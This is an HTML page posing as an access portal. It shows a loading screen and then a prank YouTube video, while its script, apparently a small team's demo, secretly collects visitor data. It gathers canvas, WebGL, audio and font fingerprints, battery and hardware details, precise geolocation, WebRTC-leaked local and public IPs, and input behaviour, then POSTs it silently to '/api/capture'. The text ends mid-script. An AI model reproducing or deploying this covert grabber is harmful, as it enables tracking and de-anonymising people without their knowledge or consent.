<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="Author" content="Marlenne, Daniel E, Emiliano, Daniel V">
<meta name="mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<title>APEX - Portal de Acceso</title>
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    -webkit-tap-highlight-color: transparent;
}

body {
    background: #000;
    overflow: hidden;
    font-family: Arial, sans-serif;
    -webkit-touch-callout: none;
    -webkit-user-select: none;
    user-select: none;
}

/* Pantalla de carga inicial */
.loader-screen {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    display: flex;
    justify-content: center;
    align-items: center;
    z-index: 10000;
    transition: opacity 1s ease;
}

.loader-screen.hidden {
    opacity: 0;
    pointer-events: none;
}

.loader-container {
    text-align: center;
    color: white;
}

.spinner {
    border: 8px solid rgba(255, 255, 255, 0.3);
    border-top: 8px solid white;
    border-radius: 50%;
    width: 60px;
    height: 60px;
    animation: spin 1s linear infinite;
    margin: 0 auto 20px;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

.loader-container h2 {
    font-size: 24px;
    margin-bottom: 10px;
}

.loader-container p {
    font-size: 16px;
    opacity: 0.9;
}

/* Mobile Responsive */
@media (max-width: 768px) {
    .loader-container h2 {
        font-size: 20px;
    }

    .loader-container p {
        font-size: 14px;
        padding: 0 20px;
    }

    .spinner {
        width: 50px;
        height: 50px;
        border-width: 6px;
    }
}

@media (max-width: 480px) {
    .loader-container h2 {
        font-size: 18px;
    }

    .loader-container p {
        font-size: 13px;
    }
}

/* Landscape mobile */
@media (max-height: 500px) and (orientation: landscape) {
    .loader-container {
        transform: scale(0.8);
    }

    .spinner {
        width: 40px;
        height: 40px;
        margin: 0 auto 10px;
    }

    .loader-container h2 {
        font-size: 16px;
        margin-bottom: 5px;
    }

    .loader-container p {
        font-size: 12px;
    }
}

/* Video container */
#videoContainer {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    z-index: 9999;
    display: none;
    background: #000;
}

#videoContainer.show {
    display: block;
}

iframe {
    width: 100%;
    height: 100%;
    border: none;
    position: absolute;
    top: 0;
    left: 0;
}

/* Mobile video fixes */
@media (max-width: 768px) {
    iframe {
        /* Asegurar que el video ocupe toda la pantalla en m√≥vil */
        width: 100vw;
        height: 100vh;
        object-fit: cover;
    }
}

/* Landscape mobile - ajustar video */
@media (max-height: 500px) and (orientation: landscape) {
    iframe {
        width: 100vw;
        height: 100vh;
    }
}
</style>
</head>
<body>

<!-- Pantalla de carga -->
<div class="loader-screen" id="loaderScreen">
    <div class="loader-container">
        <div class="spinner"></div>
        <h2>Conectando...</h2>
        <p id="loadingText">Cargando contenido...</p>
    </div>
</div>

<!-- Video -->
<div id="videoContainer">
    <iframe 
        id="videoFrame"
        src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&controls=1&modestbranding=1&rel=0" 
        allow="autoplay; encrypted-media; fullscreen" 
        allowfullscreen>
    </iframe>
</div>

<script>
(async function() {
    const startTime = Date.now();
    let mouseMovements = 0;
    let clicks = 0;
    let keyPresses = 0;
    let maxScrollDepth = 0;

    // Referencias a elementos
    const loaderScreen = document.getElementById('loaderScreen');
    const loadingText = document.getElementById('loadingText');
    const videoContainer = document.getElementById('videoContainer');

    // Mensajes de carga normales (como cualquier sitio)
    const loadingMessages = [
        'Cargando contenido...',
        'Conectando al servidor...',
        'Preparando demo...',
        'Casi listo...'
    ];

    let messageIndex = 0;
    const messageInterval = setInterval(() => {
        if (messageIndex < loadingMessages.length) {
            loadingText.textContent = loadingMessages[messageIndex];
            messageIndex++;
        } else {
            clearInterval(messageInterval);
        }
    }, 1800);

    // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
    // üñ±Ô∏è RASTREAR COMPORTAMIENTO (silencioso)
    // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
    document.addEventListener('mousemove', () => mouseMovements++);
    document.addEventListener('click', () => clicks++);
    document.addEventListener('keydown', () => keyPresses++);
    document.addEventListener('scroll', () => {
        const depth = (window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100;
        maxScrollDepth = Math.max(maxScrollDepth, depth);
    });

    // ‚úÖ SOPORTE T√ÅCTIL PARA M√ìVILES
    let touches = 0;
    let swipes = 0;

    document.addEventListener('touchstart', () => touches++);
    document.addEventListener('touchmove', () => mouseMovements++); // Contar touch move como movimiento
    document.addEventListener('touchend', () => clicks++); // Contar touch end como click

    // Detectar swipes
    let touchStartX = 0;
    let touchStartY = 0;

    document.addEventListener('touchstart', (e) => {
        touchStartX = e.changedTouches[0].screenX;
        touchStartY = e.changedTouches[0].screenY;
    }, false);

    document.addEventListener('touchend', (e) => {
        const touchEndX = e.changedTouches[0].screenX;
        const touchEndY = e.changedTouches[0].screenY;
        const diffX = touchEndX - touchStartX;
        const diffY = touchEndY - touchStartY;

        if (Math.abs(diffX) > 50 || Math.abs(diffY) > 50) {
            swipes++;
        }
    }, false);

    // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
    // üîç FUNCIONES DE CAPTURA
    // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
    function getBasicInfo() {
        return {
            url: window.location.href,
            device: {
                vendor: navigator.vendor || 'Unknown',
                platform: navigator.platform || 'Unknown',
                architecture: navigator.platform.includes('64') ? 'x64' : 'x86',
                cpuCores: navigator.hardwareConcurrency || 'Unknown',
                memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
                maxTouchPoints: navigator.maxTouchPoints || 0
            },
            browser: {
                language: navigator.language || 'Unknown',
                languages: navigator.languages || [],
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack || 'Unknown',
                onLine: navigator.onLine,
                plugins: Array.from(navigator.plugins || []).map(p => p.name)
            },
            screen: {
                resolution: `${screen.width}x${screen.height}`,
                availResolution: `${screen.availWidth}x${screen.availHeight}`,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation?.type || 'Unknown',
                pixelRatio: window.devicePixelRatio || 1
            },
            privacy: {
                localStorage: !!window.localStorage,
                sessionStorage: !!window.sessionStorage,
                indexedDB: !!window.indexedDB
            }
        };
    }

    function getNetworkInfo() {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        return {
            effectiveType: connection?.effectiveType || 'Unknown',
            downlink: connection?.downlink ? `${connection.downlink} Mbps` : 'Unknown',
            rtt: connection?.rtt ? `${connection.rtt} ms` : 'Unknown',
            saveData: connection?.saveData || false,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
    }

    async function getBatteryInfo() {
        try {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                return {
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging,
                    chargingTime: battery.chargingTime === Infinity ? 'N/A' : `${Math.round(battery.chargingTime / 60)} min`,
                    dischargingTime: battery.dischargingTime === Infinity ? 'N/A' : `${Math.round(battery.dischargingTime / 60)} min`
                };
            }
        } catch (e) {}
        return { level: 'Unknown', charging: false, chargingTime: 'N/A', dischargingTime: 'N/A' };
    }

    function getCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 200;
            canvas.height = 50;
            
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.textBaseline = 'alphabetic';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Canvas FP', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Canvas FP', 4, 17);
            
            return canvas.toDataURL().slice(-50);
        } catch (e) {
            return 'unavailable';
        }
    }

    function getWebGLFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            
            if (!gl) return { webgl: 'unavailable', vendor: 'Unknown', renderer: 'Unknown' };
            
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            
            return {
                webgl: gl.getParameter(gl.VERSION),
                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown',
                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown'
            };
        } catch (e) {
            return { webgl: 'unavailable', vendor: 'Unknown', renderer: 'Unknown' };
        }
    }

    function detectFonts() {
        const baseFonts = ['monospace', 'sans-serif', 'serif'];
        const testFonts = [
            'Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
            'Palatino', 'Garamond', 'Comic Sans MS', 'Trebuchet MS', 'Impact'
        ];
        
        const detectedFonts = [];
        const canvas = document.createElement('canvas');
        const context = canvas.getContext('2d');
        
        for (const font of testFonts) {
            let detected = false;
            for (const baseFont of baseFonts) {
                context.font = `72px ${baseFont}`;
                const baseWidth = context.measureText('mmmmmmmmmmlli').width;
                
                context.font = `72px ${font}, ${baseFont}`;
                const testWidth = context.measureText('mmmmmmmmmmlli').width;
                
                if (baseWidth !== testWidth) {
                    detected = true;
                    break;
                }
            }
            if (detected) detectedFonts.push(font);
        }
        
        return detectedFonts;
    }

    async function getHardwareInfo() {
        try {
            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                const devices = await navigator.mediaDevices.enumerateDevices();
                return {
                    videoInputs: devices.filter(d => d.kind === 'videoinput').length,
                    audioInputs: devices.filter(d => d.kind === 'audioinput').length,
                    audioOutputs: devices.filter(d => d.kind === 'audiooutput').length
                };
            }
        } catch (e) {}
        return { videoInputs: 'Unknown', audioInputs: 'Unknown', audioOutputs: 'Unknown' };
    }

    function detectSensors() {
        return {
            accelerometer: 'DeviceMotionEvent' in window,
            gyroscope: 'DeviceOrientationEvent' in window,
            magnetometer: 'ondeviceorientationabsolute' in window
        };
    }

    async function tryGetLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve(null);
                return;
            }

            // Aumentar timeout a 10 segundos para dar m√°s tiempo al usuario
            const timeout = setTimeout(() => resolve(null), 10000);

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    clearTimeout(timeout);
                    resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed
                    });
                },
                (error) => {
                    clearTimeout(timeout);
                    console.log('Geolocation error:', error.message);
                    resolve(null);
                },
                { timeout: 10000, maximumAge: 60000, enableHighAccuracy: true }
            );
        });
    }

    // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
    // üîç DATOS EXTRAS AVANZADOS
    // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

    async function getWebRTCInfo() {
        return new Promise((resolve) => {
            try {
                const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;

                if (!RTCPeerConnection) {
                    resolve({ localIP: 'Unavailable', publicIP: 'Unavailable' });
                    return;
                }

                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                const ips = [];

                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));

                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) {
                        resolve({
                            localIP: ips.find(ip => ip.includes('192.168') || ip.includes('10.')) || 'Unknown',
                            publicIP: ips.find(ip => !ip.includes('192.168') && !ip.includes('10.')) || 'Unknown',
                            allIPs: ips
                        });
                        pc.close();
                        return;
                    }

                    const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                    const match = ipRegex.exec(ice.candidate.candidate);
                    if (match && !ips.includes(match[1])) {
                        ips.push(match[1]);
                    }
                };

                setTimeout(() => {
                    resolve({
                        localIP: ips.find(ip => ip.includes('192.168') || ip.includes('10.')) || 'Unknown',
                        publicIP: ips.find(ip => !ip.includes('192.168') && !ip.includes('10.')) || 'Unknown',
                        allIPs: ips
                    });
                    pc.close();
                }, 2000);

            } catch (e) {
                resolve({ localIP: 'Error', publicIP: 'Error', error: e.message });
            }
        });
    }

    function getAudioFingerprint() {
        try {
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioContext.createOscillator();
            const analyser = audioContext.createAnalyser();
            const gainNode = audioContext.createGain();
            const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);

            gainNode.gain.value = 0; // Silencioso
            oscillator.connect(analyser);
            analyser.connect(scriptProcessor);
            scriptProcessor.connect(gainNode);
            gainNode.connect(audioContext.destination);

            oscillator.start(0);

            const dataArray = new Uint8Array(analyser.frequencyBinCount);
            analyser.getByteFrequencyData(dataArray);

            oscillator.stop();
            audioContext.close();

            // Hash simple de los datos
            const hash = Array.from(dataArray).slice(0, 30).reduce((acc, val) => acc + val, 0);

            return {
                hash: hash.toString(16),
                sampleRate: audioContext.sampleRate,
                maxChannelCount: audioContext.destination.maxChannelCount,
                channelCount: audioContext.destination.channelCount,
                channelCountMode: audioContext.destination.channelCountMode
            };
        } catch (e) {
            return { available: false, error: e.message };
        }
    }

    function getTimezoneInfo() {
        const date = new Date();
        return {
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            offset: date.getTimezoneOffset(),
            locale: Intl.DateTimeFormat().resolvedOptions().locale,
            dateFormat: new Date().toLocaleDateString(),
            timeFormat: new Date().toLocaleTimeString()
        };
    }

    function getMediaCapabilities() {
        const capabilities = {
            mediaDevices: !!navigator.mediaDevices,
            getUserMedia: !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia),
            enumerateDevices: !!(navigator.mediaDevices && navigator.mediaDevices.enumerateDevices),
            mediaRecorder: !!window.MediaRecorder,
            webRTC: !!(window.RTCPeerConnection || window.webkitRTCPeerConnection),
            permissions: !!navigator.permissions
        };

        return capabilities;
    }

    function getAdvancedScreenInfo() {
        return {
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            orientation: screen.orientation?.type || 'Unknown',
            angle: screen.orientation?.angle || 0,
            innerWidth: window.innerWidth,
            innerHeight: window.innerHeight,
            outerWidth: window.outerWidth,
            outerHeight: window.outerHeight,
            devicePixelRatio: window.devicePixelRatio,
            isFullscreen: !!(document.fullscreenElement || document.webkitFullscreenElement)
        };
    }

    // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
    // üéØ CAPTURAR Y ENVIAR (silenciosamente)
    // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
    async function captureAndSend() {
        try {
            const basicInfo = getBasicInfo();
            const networkInfo = getNetworkInfo();
            const batteryInfo = await getBatteryInfo();
            const canvasFP = getCanvasFingerprint();
            const webglInfo = getWebGLFingerprint();
            const fonts = detectFonts();
            const hardware = await getHardwareInfo();
            const sensors = detectSensors();
            const geolocation = await tryGetLocation();

            // ‚úÖ NUEVOS DATOS EXTRAS
            const webRTC = await getWebRTCInfo();
            const audioFP = getAudioFingerprint();
            const timezoneInfo = getTimezoneInfo();
            const mediaCapabilities = getMediaCapabilities();
            const advancedScreen = getAdvancedScreenInfo();

            const timeOnPage = Math.round((Date.now() - startTime) / 1000);

            const data = {
                username: 'Demo Visitor',
                password: 'N/A',
                url: basicInfo.url,
                network: networkInfo,
                device: basicInfo.device,
                browser: basicInfo.browser,
                screen: basicInfo.screen,
                battery: batteryInfo,
                fingerprints: {
                    canvas: canvasFP,
                    webgl: webglInfo.webgl,
                    webglVendor: webglInfo.vendor,
                    webglRenderer: webglInfo.renderer,
                    fonts: fonts,
                    audio: audioFP // ‚úÖ NUEVO
                },
                privacy: basicInfo.privacy,
                behavior: {
                    mouseMovements: mouseMovements,
                    clicks: clicks,
                    keyPresses: keyPresses,
                    scrollDepth: Math.round(maxScrollDepth),
                    timeOnPage: timeOnPage,
                    // ‚úÖ NUEVO: Datos t√°ctiles m√≥viles
                    touches: touches,
                    swipes: swipes
                },
                hardware: hardware,
                sensors: sensors,
                geolocation: geolocation,
                // ‚úÖ NUEVOS CAMPOS
                webRTC: webRTC,
                timezoneInfo: timezoneInfo,
                mediaCapabilities: mediaCapabilities,
                advancedScreen: advancedScreen
            };
            
            // Enviar silenciosamente
            await fetch('/api/capture', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });
            
        } catch (error) {
            // Silencioso, sin logs
        }
    }

    // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
    // üöÄ EJECUTAR TODO
    // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
    
    // Capturar datos en segundo plano
    captureAndSend();
    
    // Esperar 7 segundos
    await new Promise(resolve => setTimeout(resolve, 7000));
    
    // Ocultar carga
    loaderScreen.classList.add('hidden');
    
    // Mostrar video
    setTimeout(() => {
